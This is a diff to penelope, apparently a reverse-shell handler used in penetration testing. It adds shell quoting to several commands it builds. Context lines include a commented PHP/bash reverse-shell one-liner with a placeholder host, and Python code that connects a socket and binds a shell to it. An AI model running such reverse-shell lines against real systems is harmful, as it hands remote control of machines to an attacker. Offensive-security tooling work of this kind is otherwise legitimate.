@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.21.10"
+__version__ = "0.21.11"
 
 import os
 import io
@@ -2720,7 +2720,8 @@ class Session:
 			else:
 				_bin = self.bin['python3'] or self.bin['python']
 				if _bin:
-					version = self.exec(f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True)
+					_q = shlex.quote(_bin)
+					version = self.exec(f"{_q} -V 2>&1 || {_q} --version 2>&1", value=True)
 					try:
 						major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
 					except Exception:
@@ -2995,7 +2996,7 @@ class Session:
 				name = rand(10)
 				resolved = self.exec(
 					'for d in /dev/shm /tmp /var/tmp "$HOME" .; do '
-					f'echo x > "$d/{name}" 2>/dev/null && '
+					f'(echo x > "$d/{name}") 2>/dev/null && '
 					f'{{ (cd "$d" && pwd); rm -f "$d/{name}"; break; }}; done',
 					value=True)
 				self._tmp = resolved if (isinstance(resolved, str) and resolved.startswith("/")) else False
@@ -3636,9 +3637,10 @@ class Session:
 		archive = self.need_binary("Standalone Python", URLS[url_key])
 		if not archive:
 			return False
+		q = shlex.quote(archive)
 		path = self.exec(
-			f'D="$(dirname "{archive}")" && tar -xzf "{archive}" -C "$D" 2>/dev/null && '
-			f'rm -f "{archive}" && '
+			f'D="$(dirname {q})" && tar -xzf {q} -C "$D" 2>/dev/null && '
+			f'rm -f {q} && '
 			f'"$D/python/bin/python3" -c "import sys;print(sys.executable)" 2>/dev/null',
 			value=True
 		)
@@ -3652,7 +3654,7 @@ class Session:
 		def make_dest():
 			if self.OS != "Unix":
 				return self.tmp
-			d = self.exec(f'mktemp -d -p "{self.exec_tmp}" 2>/dev/null', value=True)
+			d = self.exec(f'mktemp -d {shlex.quote(self.exec_tmp + "/XXXXXXXXXX")} 2>/dev/null', value=True)
 			if not (isinstance(d, str) and d.startswith("/")):
 				logger.error(f"Could not create a temp directory for {name}")
 				return None
@@ -3765,12 +3767,12 @@ class Session:
 					# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
 					# Silently convert the shell to non-interactive before PTY upgrade.
 					self.interactive = False
-					self.exec(f"exec {self.shell}", raw=True, timeout=max(self.latency or 0, 0.5))
+					self.exec(f"exec {shlex.quote(self.shell)}", raw=True, timeout=max(self.latency or 0, 0.5))
 					self.echoing = False
 
 				shell_marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
 				response = self.exec(
-					f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
+					f'export TERM=xterm-256color; export SHELL={shlex.quote(self.shell)}; {cmd}',
 					separate=True,
 					expect_func=lambda data: shell_marker in data,
 					raw=True
@@ -4833,7 +4835,7 @@ class Session:
 							s.connect(("{host}", {port}))
 							for fd in (0, 1, 2):
 								os.dup2(s.fileno(), fd)
-							os.execl("{self.shell}", "{self.shell}")
+							os.execl({self.shell!r}, {self.shell!r})
 							os._exit(1)
 					""", python=True)
 					return True
@@ -5779,7 +5781,7 @@ class uac(Module):
 			if not uploaded:
 				logger.error("Failed to upload UAC")
 				return False
-			path = uploaded[0]
+			path = shlex.quote(uploaded[0])
 			result = session.exec(f"tar xf {path} -C {shlex.quote(session.exec_tmp)} >/dev/null", value=True)
 			if not result:
 				session.exec(f"rm -f {path}")
